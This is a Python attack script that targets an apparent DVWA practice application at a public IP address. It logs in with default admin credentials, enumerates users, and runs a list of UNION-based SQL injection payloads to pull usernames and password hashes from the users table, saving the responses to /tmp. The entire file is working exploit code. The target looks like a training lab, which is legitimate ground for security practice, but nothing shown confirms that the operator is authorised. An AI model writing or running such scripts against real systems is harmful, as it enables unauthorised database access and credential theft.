
import requests
import re
from html.parser import HTMLParser

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    print("[*] Extracting all users from database...")
    
    # Try to extract all users by trying different IDs
    users_data = []
    
    for user_id in range(1, 10):
        params = {
            "id": str(user_id),
            "Submit": "Submit"
        }
        
        response = session.get(sqli_url, params=params, timeout=10)
        
        # Extract data
        if "First name:" in response.text:
            # Extract using regex
            id_match = re.search(r'ID: (\d+)', response.text)
            fn_match = re.search(r'First name: ([^<]+)', response.text)
            sn_match = re.search(r'Surname: ([^<]+)', response.text)
            
            if id_match and fn_match and sn_match:
                user_id = id_match.group(1)
                first_name = fn_match.group(1).strip()
                surname = sn_match.group(1).strip()
                
                print(f"[+] User {user_id}: {first_name} {surname}")
                users_data.append({
                    'id': user_id,
                    'first_name': first_name,
                    'surname': surname
                })
        else:
            # No more users
            break
    
    print(f"\n[*] Found {len(users_data)} users")
    
    # Now try SQL injection to get password hashes
    print("\n[*] Attempting SQL injection to extract password hashes...")
    
    # Different SQLi payloads
    sqli_payloads = [
        # Try to select from users table
        ("1 UNION SELECT user_id, user, password FROM users--", "Basic UNION"),
        ("1' UNION SELECT user_id, user, password FROM users--", "UNION with quote"),
        ("999 UNION SELECT NULL, CONCAT(user_id, '|', user, '|', password), password FROM users--", "CONCAT payload"),
        ("1' UNION SELECT user_id, CONCAT(user, ':', password), password FROM users--", "Concatenated"),
    ]
    
    for payload, desc in sqli_payloads:
        print(f"\n[*] Testing payload ({desc}): {payload}")
        
        params = {
            "id": payload,
            "Submit": "Submit"
        }
        
        try:
            response = session.get(sqli_url, params=params, timeout=10)
            
            # Check for results
            if "First name:" in response.text or "user" in response.text.lower():
                # Extract data
                lines = response.text.split('\n')
                for line in lines:
                    if 'First name:' in line or 'user' in line.lower() and ':' in line:
                        print(f"[+] {line.strip()}")
                
                # Save response
                with open(f"/tmp/sqli_{desc.replace(' ', '_')}.html", "w") as f:
                    f.write(response.text)
                    
                # Also search for the <pre> section
                start = response.text.find('<pre>')
                end = response.text.find('</pre>')
                if start > 0 and end > start:
                    print(f"[+] Found data in <pre> section:")
                    print(response.text[start+5:end])
        except Exception as e:
            print(f"[-] Error: {e}")

